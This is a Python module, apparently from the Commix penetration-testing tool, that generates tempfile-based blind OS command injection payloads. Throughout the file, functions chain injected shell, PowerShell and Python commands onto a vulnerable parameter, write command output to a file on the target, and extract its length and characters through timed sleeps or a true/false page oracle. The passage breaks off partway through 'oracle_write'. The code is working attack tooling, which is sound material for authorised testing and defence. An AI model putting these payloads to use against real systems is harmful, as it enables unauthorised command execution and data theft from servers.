#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from src.utils import settings
from src.core.controller import checks
from src.core.techniques.time_based import tb_payloads
from src.core.techniques.boolean_based import bb_payloads

"""
The "tempfile-based" technique on Semiblind OS Command Injection.
The available "tempfile-based" payloads.
"""

"""
The file's contents as one line of text, joined and trimmed the same way every payload here reads
it, so a length and the characters counted off it always agree.
"""
def windows_file_text(OUTPUT_TEXTFILE):
  return "([string](Get-Content " + OUTPUT_TEXTFILE + ")).trim()"

"""
A command's output as one line of text. Multi-line output is joined, so a single number describes
its length however many lines it came in.
"""
def windows_cmd_text(cmd):
  return "([string](cmd /c " + cmd + ")).trim()"

def flattened_file_text(OUTPUT_TEXTFILE):
  """
  The file's contents as one line: every newline in it turned into a space.

  Output of any shape is measured and read back as a single string, so the newlines between lines
  have to become something the one line can hold. Read by redirection rather than through a pipe,
  because the separator under test is the only one a payload is allowed to chain itself with.
  """
  return "tr '" + settings.END_LINE.ESCAPED_LF + "' '\\040' <" + OUTPUT_TEXTFILE

def trimmed_output_text():
  """
  The flattened text without the space standing in for the trailing newline, which had been making
  every result a character longer than it was. Matched as a class rather than written out, so that
  a script rewriting whitespace cannot rewrite it, and suffix removal adds no command of its own.
  """
  return "${" + settings.RANDOM_VAR_GENERATOR + "%[[:space:]]}"

"""
Tempfile-based decision payload (check if host is vulnerable).
"""
def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
  payload = ""
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is not None:
      payload = (chain +
                settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'" +
                checks.windows_probe(checks.WINDOWS_CHAIN,
                                     "powershell.exe -InputFormat none write-host " + windows_file_text(OUTPUT_TEXTFILE) + ".length",
                                     "EQU", j, timesec)
                )

  else:
    if separator in (";", "\n", "\r\n") :
      payload = (separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                # Find the length of the output.
                settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                "sleep $((" + str(timesec) + "*(" + str(j) + "==${" + settings.RANDOM_VAR_GENERATOR + "1})))"
                )
    elif separator == "&":
      payload = (separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + "&&" +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + "&&" +
                settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}&&" +
                "[ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ]&&" +
                "sleep " + str(timesec)
                )

    elif separator == "&&" :
      ampersand = "&"
      payload = (ampersand +
                "sleep 0" + separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "} " + separator +
                "[ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
                "sleep " + str(timesec)
                )
      

    elif separator in ("|", "||"):
      pipe = "|"
      payload = (pipe +
                "[ " + str(j) + " -ne $(printf '%s' \"" + TAG + "\"" + pipe + "tee " + OUTPUT_TEXTFILE + pipe + "wc -c) ]" + "||" +
                "sleep " + str(timesec)
                )
    else:
      pass

    payload = checks.terminate_payload(payload, separator)

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_interpreter(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
  payload = ""
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is not None:
      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(len(file.read().strip()))\""
      payload = (chain +
                settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'" +
                checks.windows_probe(checks.WINDOWS_CHAIN, python_payload, "EQU", j, timesec)
                )

  else:
    if separator in (";", "\n", "\r\n") :
      payload = (separator +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX + separator +
                # Find the length of the output, using readline().
                settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\"" + settings.CMD_SUB_SUFFIX + separator +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(j) + "==${" + settings.RANDOM_VAR_GENERATOR + "1}))))\"" + settings.CMD_SUB_SUFFIX
                )
    elif separator == "&&" :
      ampersand = "&"
      payload = (ampersand +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(0)\") " + separator +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX + separator +
                # Find the length of the output, using readline().
                settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\") " + separator +
                "[ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + ")\") "
                )
    elif separator == "&":
      payload = (separator +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX + settings.SINGLE_WHITESPACE +
                "[ " + str(j) + " -eq " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\"" + settings.CMD_SUB_SUFFIX + " ]" + "&&" +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                )
    elif separator in ("|", "||"):
      pipe = "|"
      payload = (pipe +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX + settings.SINGLE_WHITESPACE +
                # Find the length of the output, using readline().
                "[ " + str(j) + " -ne " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\") ] " + "||" +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + ")\") "
                )
    else:
      pass

    payload = checks.terminate_payload(payload, separator)

  return checks.sanitize_payload_newlines(payload)

"""
Execute shell commands on vulnerable host.
"""
def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method, operator="-le"):
  payload = ""
  inverted_operator = "-gt" if operator == "-le" else "-ne"
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is not None:
      # 'GEQ', so the length can be binary searched - an equality test only ever answers the one
      # candidate it is given.
      win_operator = "GEQ" if operator == "-le" else "EQU"
      # Stored as one decimal per character: extraction reads a character off it by number, and
      # their count is the length being searched for.
      ascii_output = ("powershell.exe -InputFormat none write-host ([int[]][char[]](" +
                      windows_cmd_text(cmd) + "))")
      payload = (chain +
                "for /f \"tokens=* eol=\" %i in ('cmd /c \"" + ascii_output + "\"') do " +
                settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + " '%i'" +
                checks.windows_probe(checks.WINDOWS_CHAIN,
                                     "powershell.exe -InputFormat none write-host " + windows_file_text(OUTPUT_TEXTFILE) + ".split([char]32).length",
                                     win_operator, j, timesec)
                )
  else:
    settings.USER_APPLIED_CMD = cmd
    if separator in (";", "\n", "\r\n") :
      arith_operator = "<=" if operator == "-le" else "=="
      payload = (separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " " + flattened_file_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + separator +
                "echo \"" + trimmed_output_text() + "\" >" + OUTPUT_TEXTFILE + separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                # Find the length of the output.
                settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                "sleep $((" + str(timesec) + "*(" + str(j) + arith_operator + settings.RANDOM_VAR_GENERATOR + "1)))" + separator +
                # Transform to ASCII
                settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "od -A n -t d1 <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                "echo $" + settings.RANDOM_VAR_GENERATOR + "1 >" + OUTPUT_TEXTFILE
                )
    elif separator == "&":
      payload = (separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + "&&" + " " + flattened_file_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + "&&" +
                "echo \"" + trimmed_output_text() + "\" >" + OUTPUT_TEXTFILE + "&&" +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + "&&" +
                settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}&&" +
                "[ " + str(j) + " " + operator + " ${" + settings.RANDOM_VAR_GENERATOR + "1} ]&&" +
                "sleep " + str(timesec) + "&&" +
                # Transform to ASCII
                settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "od -A n -t d1 <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + "&&" +
                "echo $" + settings.RANDOM_VAR_GENERATOR + "1 >" + OUTPUT_TEXTFILE
                )

    elif separator == "&&" :
      ampersand = "&"
      payload = (ampersand +
                "sleep 0 " + separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " " + flattened_file_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + separator +
                "echo \"" + trimmed_output_text() + "\"" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                # Find the length of the output.
                settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                "[ " + str(j) + " " + operator + " ${" + settings.RANDOM_VAR_GENERATOR + "1} ]" + separator +
                "sleep " + str(timesec) + separator +
                # Transform to ASCII
                settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "od -A n -t d1<" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                "echo $" + settings.RANDOM_VAR_GENERATOR + "1" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE
                )

    elif separator in ("|", "||"):
      pipe = "|"
      cmd = cmd.rstrip()
      cmd = checks.add_command_substitution(cmd)
      payload = (pipe +
                "[ " + str(j) + settings.SINGLE_WHITESPACE + inverted_operator + " $(" + cmd + pipe + "tee " + OUTPUT_TEXTFILE + pipe + "wc -c) ]" + "||" +
                "sleep " + str(timesec)
                )
    else:
      pass

    payload = checks.terminate_payload(payload, separator)

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_interpreter(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):
  payload = ""
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is not None:
      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(len(file.read().strip()))\""
      payload = (chain +
                "for /f \"tokens=* eol=\" %i in ('cmd /c " + cmd + "') do " +
                settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + " '%i'" +
                checks.windows_probe(checks.WINDOWS_CHAIN, python_payload, "EQU", j, timesec)
                )
  else:
    settings.USER_APPLIED_CMD = cmd
    if separator in (";", "\n", "\r\n") :
      payload = (separator +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX + separator +
                # Find the length of the output, using readline().
                settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\"" + settings.CMD_SUB_SUFFIX + separator +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep($((" + str(timesec) + "*(" + str(j) + "==${" + settings.RANDOM_VAR_GENERATOR + "1}))))\"" + settings.CMD_SUB_SUFFIX
                )
    elif separator == "&&" :
      ampersand = "&"
      payload = (ampersand +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX + separator +
                # Find the length of the output, using readline().
                settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") " + separator +
                "[ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                )
    elif separator == "&":
      payload = (separator +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX + settings.SINGLE_WHITESPACE +
                "[ " + str(j) + " -eq " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\"" + settings.CMD_SUB_SUFFIX + " ]" + "&&" +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                )
    elif separator in ("|", "||"):
      pipe = "|"
      payload = (pipe +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX + settings.SINGLE_WHITESPACE +
                "[ " + str(j) + " -ne " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\") ] " + "||" +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                )
    else:
      pass

    if settings.CUSTOM_INJECTION_MARKER:
      payload = checks.terminate_payload(payload, separator)

  return checks.sanitize_payload_newlines(payload)

"""
The same comparison the time-based technique asks for, which this one asks in the same words.

Both techniques prove a condition by whether the target waits, so the payload that states it is the
same payload - it was written out twice, and the two copies had to be kept in step by hand.
"""
def condition_check(separator, condition, timesec, http_request_method):
  return tb_payloads.condition_check(separator, condition, timesec, http_request_method)

# The Windows counterpart, likewise shared rather than restated.
def windows_condition_check(separator, condition, timesec, http_request_method):
  return tb_payloads.windows_condition_check(separator, condition, timesec, http_request_method)

# Read one character of the file back, by asking whether its ordinal is at or below a value.
def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method, operator="-le"):
  payload = ""
  win_operator = "GEQ" if operator == "-le" else "EQU"
  inverted_operator = "-gt" if operator == "-le" else "-ne"
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is not None:
      # Split on '[char]32', so no quote of its own has to survive cmd.exe's own quote handling.
      payload = checks.windows_probe(chain,
                                     "powershell.exe -InputFormat none write-host " + windows_file_text(OUTPUT_TEXTFILE) +
                                     ".split([char]32)[" + str(num_of_chars - 1) + "]",
                                     win_operator, ascii_char, timesec)
  else:
    if separator in (";", "\n", "\r\n") :
      arith_operator = "<=" if operator == "-le" else "=="
      payload = (separator +
                # Use space as delimiter
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "awk '{print$" + str(num_of_chars) + "}' <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                "sleep $((" + str(timesec) + "*(" + str(ascii_char) + arith_operator + settings.RANDOM_VAR_GENERATOR + ")))"
                )
    elif separator == "&&" :
      ampersand = "&"
      payload = (ampersand +
                "sleep 0" + separator +
                # Use space as delimiter
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "awk '{print$" + str(num_of_chars) + "}'<" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + " ${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
                "sleep " + str(timesec)
                )
      
    elif separator == "&":
      payload = (separator +
                "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + " $(awk '{print$" + str(num_of_chars) + "}' <" + OUTPUT_TEXTFILE + ") ]" + "&&" +
                "sleep " + str(timesec)
                )
    elif separator in ("|", "||"):
      pipe = "|"
      payload = (pipe +
                "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + inverted_operator + " $(printf '%d' \"'$(cut -c" + str(num_of_chars) + " " + OUTPUT_TEXTFILE + ")\") ]" + "||" +
                "sleep " + str(timesec)
                )
    else:
      pass

    payload = checks.terminate_payload(payload, separator)

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def get_char_alter_interpreter(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method, operator="-le"):
  payload = ""
  win_operator = "GEQ" if operator == "-le" else "EQU"
  inverted_operator = "-gt" if operator == "-le" else "-ne"
  arith_operator = "<=" if operator == "-le" else "=="
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is not None:
      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(ord(file.read().strip()[" + str(num_of_chars - 1) + "][0])); exit(0)\""
      payload = checks.windows_probe(chain, python_payload, win_operator, ascii_char, timesec)

  else:
    if separator in (";", "\n", "\r\n") :
      payload = (separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(ord(file.readlines()[0][" + str(num_of_chars - 1) + "]))\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(ascii_char) + arith_operator + "${" + settings.RANDOM_VAR_GENERATOR + "}))))\"" + settings.CMD_SUB_SUFFIX
                )
    elif separator == "&&" :
      ampersand = "&"
      payload = (ampersand +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(0)\") " + separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(ord(file.readlines()[0][" + str(num_of_chars - 1) + "]))\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + "${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                )
      
    elif separator == "&":
      payload = (separator +
                "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(ord(file.readlines()[0][" + str(num_of_chars - 1) + "]))\nexit(0)\"" + settings.CMD_SUB_SUFFIX + " ]" + "&&" +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                )
    elif separator in ("|", "||"):
      pipe = "|"
      payload = (pipe +
                "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + inverted_operator + settings.SINGLE_WHITESPACE + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(ord(file.readlines()[0][" + str(num_of_chars - 1) + "]))\nexit(0)\") ] " + "||" +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                )
    else:
      pass

    payload = checks.terminate_payload(payload, separator)

  return checks.sanitize_payload_newlines(payload)

"""
__Warning__: The alternative shells are still experimental.
"""
def fp_result_alter_interpreter(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
  payload = ""
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is not None:
      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "]); exit(0)\""
      payload = checks.windows_probe(chain, python_payload, "EQU", ascii_char, timesec)
  else:
    if separator in (";", "\n", "\r\n") :
      payload = (separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "])\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(ascii_char) + "==${" + settings.RANDOM_VAR_GENERATOR + "}))))\"" + settings.CMD_SUB_SUFFIX
                )
    elif separator == "&&" :
      ampersand = "&"
      payload = (ampersand +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(0)\") " + separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "])\nexit(0)\") " + separator +
                "[ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                )
      
    elif separator == "&":
      payload = (separator +
                "[ " + str(ascii_char) + " -eq " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "])\nexit(0)\"" + settings.CMD_SUB_SUFFIX + " ]" + "&&" +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                )
    elif separator in ("|", "||"):
      pipe = "|"
      payload = (pipe +
                "[ " + str(ascii_char) + " -ne  " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "])\nexit(0)\") ] " + "||" +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                )
    else:
      pass

    payload = checks.terminate_payload(payload, separator)

  return checks.sanitize_payload_newlines(payload)

"""
Everything below reads the same created file back through a calibrated oracle instead of a delay -
the file this technique already writes to and reads from, asked about the way the boolean-based
technique asks about a command's output, since a page that already tells true from false can tell
this apart for free where a delay would otherwise be paid for it. On Windows the same question is
asked the way the boolean-based technique asks a Windows target one: cmd.exe hands no exit status
back either way, so 'bb_payloads' is reused directly, pointed at 'type FILE' in place of the
command it would otherwise re-run.
"""

"""
Whether this separator can carry a bare test the way the boolean-based technique asks one - the
same restriction that technique places on itself, for the same reason.
"""
def oracle_supported(separator):
  return bb_payloads._supported(separator) and separator != "|"

"""
Write a command's output into the created file once, flattened to one line the same way the
delay-based reading already flattens it - nothing here asks a question, so nothing here waits.
"""
def oracle_write(separator, cmd, OUTPUT_TEXTFILE):
  if not oracle_supported(separator):
    return ""
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    return (chain +
            settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + windows_cmd_text(cmd) +
            checks.windows_tail(chain)
            )
  var = settings.RANDOM_VAR_GENERATOR
  payload = (separator +
            var + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator +
